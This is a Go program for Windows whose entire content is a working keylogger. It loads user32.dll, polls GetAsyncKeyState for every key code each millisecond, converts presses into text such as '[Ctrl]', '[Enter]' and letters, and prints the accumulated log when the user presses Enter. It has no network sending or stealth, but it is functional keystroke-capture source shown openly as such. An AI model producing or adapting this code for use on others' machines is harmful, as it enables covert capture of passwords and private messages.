package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	keylog               string
)

const (
	VK_LBUTTON             = 0x01
	VK_RBUTTON             = 0x02
	VK_CANCEL              = 0x03
	VK_MBUTTON             = 0x04
	VK_XBUTTON1            = 0x05
	VK_XBUTTON2            = 0x06
	VK_BACK                = 0x08
	VK_TAB                 = 0x09
	VK_CLEAR               = 0x0C
	VK_RETURN              = 0x0D
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12
	VK_PAUSE               = 0x13
	VK_CAPITAL             = 0x14
	VK_KANA                = 0x15
	VK_HANGEUL             = 0x15
	VK_HANGUL              = 0x15
	VK_JUNJA               = 0x17
	VK_FINAL               = 0x18
	VK_HANJA               = 0x19
	VK_KANJI               = 0x19
	VK_ESCAPE              = 0x1B
	VK_CONVERT             = 0x1C
	VK_NONCONVERT          = 0x1D
	VK_ACCEPT              = 0x1E
	VK_MODECHANGE          = 0x1F
	VK_SPACE               = 0x20
	VK_PRIOR               = 0x21
	VK_NEXT                = 0x22
	VK_END                 = 0x23
	VK_HOME                = 0x24
	VK_LEFT                = 0x25
	VK_UP                  = 0x26
	VK_RIGHT               = 0x27
	VK_DOWN                = 0x28
	VK_SELECT              = 0x29
	VK_PRINT               = 0x2A
	VK_EXECUTE             = 0x2B
	VK_SNAPSHOT            = 0x2C
	VK_INSERT              = 0x2D
	VK_DELETE              = 0x2E
	VK_HELP                = 0x2F
	VK_LWIN                = 0x5B
	VK_RWIN                = 0x5C
	VK_APPS                = 0x5D
	VK_SLEEP               = 0x5F
	VK_NUMPAD0             = 0x60
	VK_NUMPAD1             = 0x61
	VK_NUMPAD2             = 0x62
	VK_NUMPAD3             = 0x63
	VK_NUMPAD4             = 0x64
	VK_NUMPAD5             = 0x65
	VK_NUMPAD6             = 0x66
	VK_NUMPAD7             = 0x67
	VK_NUMPAD8             = 0x68
	VK_NUMPAD9             = 0x69
	VK_MULTIPLY            = 0x6A
	VK_ADD                 = 0x6B
	VK_SEPARATOR           = 0x6C
	VK_SUBTRACT            = 0x6D
	VK_DECIMAL             = 0x6E
	VK_DIVIDE              = 0x6F
	VK_F1                  = 0x70
	VK_F2                  = 0x71
	VK_F3                  = 0x72
	VK_F4                  = 0x73
	VK_F5                  = 0x74
	VK_F6                  = 0x75
	VK_F7                  = 0x76
	VK_F8                  = 0x77
	VK_F9                  = 0x78
	VK_F10                 = 0x79
	VK_F11                 = 0x7A
	VK_F12                 = 0x7B
	VK_F13                 = 0x7C
	VK_F14                 = 0x7D
	VK_F15                 = 0x7E
	VK_F16                 = 0x7F
	VK_F17                 = 0x80
	VK_F18                 = 0x81
	VK_F19                 = 0x82
	VK_F20                 = 0x83
	VK_F21                 = 0x84
	VK_F22                 = 0x85
	VK_F23                 = 0x86
	VK_F24                 = 0x87
	VK_NUMLOCK             = 0x90
	VK_SCROLL              = 0x91
	VK_OEM_NEC_EQUAL       = 0x92
	VK_OEM_FJ_JISHO        = 0x92
	VK_OEM_FJ_MASSHOU      = 0x93
	VK_OEM_FJ_TOUROKU      = 0x94
	VK_OEM_FJ_LOYA         = 0x95
	VK_OEM_FJ_ROYA         = 0x96
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4
	VK_RMENU               = 0xA5
	VK_BROWSER_BACK        = 0xA6
	VK_BROWSER_FORWARD     = 0xA7
	VK_BROWSER_REFRESH     = 0xA8
	VK_BROWSER_STOP        = 0xA9
	VK_BROWSER_SEARCH      = 0xAA
	VK_BROWSER_FAVORITES   = 0xAB
	VK_BROWSER_HOME        = 0xAC
	VK_VOLUME_MUTE         = 0xAD
	VK_VOLUME_DOWN         = 0xAE
	VK_VOLUME_UP           = 0xAF
	VK_MEDIA_NEXT_TRACK    = 0xB0
	VK_MEDIA_PREV_TRACK    = 0xB1
	VK_MEDIA_STOP          = 0xB2
	VK_MEDIA_PLAY_PAUSE    = 0xB3
	VK_LAUNCH_MAIL         = 0xB4
	VK_LAUNCH_MEDIA_SELECT = 0xB5
	VK_LAUNCH_APP1         = 0xB6
	VK_LAUNCH_APP2         = 0xB7
	VK_OEM_1               = 0xBA
	VK_OEM_PLUS            = 0xBB
	VK_OEM_COMMA           = 0xBC
	VK_OEM_MINUS           = 0xBD
	VK_OEM_PERIOD          = 0xBE
	VK_OEM_2               = 0xBF
	VK_OEM_3               = 0xC0
	VK_OEM_4               = 0xDB
	VK_OEM_5               = 0xDC
	VK_OEM_6               = 0xDD
	VK_OEM_7               = 0xDE
	VK_OEM_8               = 0xDF
	VK_OEM_AX              = 0xE1
	VK_OEM_102             = 0xE2
	VK_ICO_HELP            = 0xE3
	VK_ICO_00              = 0xE4
	VK_PROCESSKEY          = 0xE5
	VK_ICO_CLEAR           = 0xE6
	VK_PACKET              = 0xE7
	VK_OEM_RESET           = 0xE9
	VK_OEM_JUMP            = 0xEA
	VK_OEM_PA1             = 0xEB
	VK_OEM_PA2             = 0xEC
	VK_OEM_PA3             = 0xED
	VK_OEM_WSCTRL          = 0xEE
	VK_OEM_CUSEL           = 0xEF
	VK_OEM_ATTN            = 0xF0
	VK_OEM_FINISH          = 0xF1
	VK_OEM_COPY            = 0xF2
	VK_OEM_AUTO            = 0xF3
	VK_OEM_ENLW            = 0xF4
	VK_OEM_BACKTAB         = 0xF5
	VK_ATTN                = 0xF6
	VK_CRSEL               = 0xF7
	VK_EXSEL               = 0xF8
	VK_EREOF               = 0xF9
	VK_PLAY                = 0xFA
	VK_ZOOM                = 0xFB
	VK_NONAME              = 0xFC
	VK_PA1                 = 0xFD
	VK_OEM_CLEAR           = 0xFE
)

func keyLogger() {
	for {
		time.Sleep(1 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))

			if int(Val) == 32769 {

				switch KEY {
				case VK_CONTROL:
					keylog += "[Ctrl]"
				case VK_BACK:
					keylog += "[Back]"
				case VK_TAB:
					keylog += "[Tab]"
				case VK_RETURN:
					keylog += "[Enter]\r\n"
				case VK_SHIFT:
					keylog += "[Shift]"
				case VK_MENU:
					keylog += "[Alt]"
				case VK_CAPITAL:
					keylog += "[CapsLock]"
				case VK_ESCAPE:
					keylog += "[Esc]"
				case VK_SPACE:
					keylog += " "
				case VK_PRIOR:
					keylog += "[PageUp]"
				case VK_NEXT:
					keylog += "[PageDown]"
				case VK_END:
					keylog += "[End]"
				case VK_HOME:
					keylog += "[Home]"
				case VK_LEFT:
					keylog += "[Left]"
				case VK_UP:
					keylog += "[Up]"
				case VK_RIGHT:
					keylog += "[Right]"
				case VK_DOWN:
					keylog += "[Down]"
				case VK_SELECT:
					keylog += "[Select]"
				case VK_PRINT:
					keylog += "[Print]"
				case VK_EXECUTE:
					keylog += "[Execute]"
				case VK_SNAPSHOT:
					keylog += "[PrintScreen]"
				case VK_INSERT:
					keylog += "[Insert]"
				case VK_DELETE:
					keylog += "[Delete]"
				case VK_HELP:
					keylog += "[Help]"
				case VK_LWIN:
					keylog += "[LeftWindows]"
				case VK_RWIN:
					keylog += "[RightWindows]"
				case VK_APPS:
					keylog += "[Applications]"
				case VK_SLEEP:
					keylog += "[Sleep]"
				case VK_NUMPAD0:
					keylog += "[Pad 0]"
				case VK_NUMPAD1:
					keylog += "[Pad 1]"
				case VK_NUMPAD2:
					keylog += "[Pad 2]"
				case VK_NUMPAD3:
					keylog += "[Pad 3]"
				case VK_NUMPAD4:
					keylog += "[Pad 4]"
				case VK_NUMPAD5:
					keylog += "[Pad 5]"
				case VK_NUMPAD6:
					keylog += "[Pad 6]"
				case VK_NUMPAD7:
					keylog += "[Pad 7]"
				case VK_NUMPAD8:
					keylog += "[Pad 8]"
				case VK_NUMPAD9:
					keylog += "[Pad 9]"
				case VK_MULTIPLY:
					keylog += "*"
				case VK_ADD:
					keylog += "+"
				case VK_SEPARATOR:
					keylog += "[Separator]"
				case VK_SUBTRACT:
					keylog += "-"
				case VK_DECIMAL:
					keylog += "."
				case VK_DIVIDE:
					keylog += "[Devide]"
				case VK_F1:
					keylog += "[F1]"
				case VK_F2:
					keylog += "[F2]"
				case VK_F3:
					keylog += "[F3]"
				case VK_F4:
					keylog += "[F4]"
				case VK_F5:
					keylog += "[F5]"
				case VK_F6:
					keylog += "[F6]"
				case VK_F7:
					keylog += "[F7]"
				case VK_F8:
					keylog += "[F8]"
				case VK_F9:
					keylog += "[F9]"
				case VK_F10:
					keylog += "[F10]"
				case VK_F11:
					keylog += "[F11]"
				case VK_F12:
					keylog += "[F12]"
				case VK_NUMLOCK:
					keylog += "[NumLock]"
				case VK_SCROLL:
					keylog += "[ScrollLock]"
				case VK_LSHIFT:
					keylog += "[LeftShift]"
				case VK_RSHIFT:
					keylog += "[RightShift]"
				case VK_LCONTROL:
					keylog += "[LeftCtrl]"
				case VK_RCONTROL:
					keylog += "[RightCtrl]"
				case VK_LMENU:
					keylog += "[LeftMenu]"
				case VK_RMENU:
					keylog += "[RightMenu]"
				case VK_OEM_1:
					keylog += ";"
				case VK_OEM_2:
					keylog += "/"
				case VK_OEM_3:
					keylog += "`"
				case VK_OEM_4:
					keylog += "["
				case VK_OEM_5:
					keylog += "\\"
				case VK_OEM_6:
					keylog += "]"
				case VK_OEM_7:
					keylog += "'"
				case VK_OEM_PERIOD:
					keylog += "."
				default:
					if 0x30 <= KEY && 0x5A >= KEY {
						keylog += string(KEY)
					}
				}
			}
		}
	}
}

func main() {
	fmt.Println("Start")
	go keyLogger()
	fmt.Println("Press Enter to exit")
	os.Stdin.Read([]byte{0})
	fmt.Println(keylog)
}
